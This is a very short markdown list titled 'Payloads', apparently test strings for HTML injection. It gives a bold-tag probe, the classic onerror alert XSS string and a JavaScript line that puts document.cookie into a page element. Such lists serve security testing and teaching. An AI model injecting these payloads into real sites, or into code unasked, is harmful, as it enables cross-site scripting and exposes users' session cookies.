# Payloads

## Payload 1: HTML Injection

"<b>test</b>"
"<img src=x onerror=alert(1)>"
'document.getElementById("output").innerHTML = "<b>" + document.cookie + "</b>";'
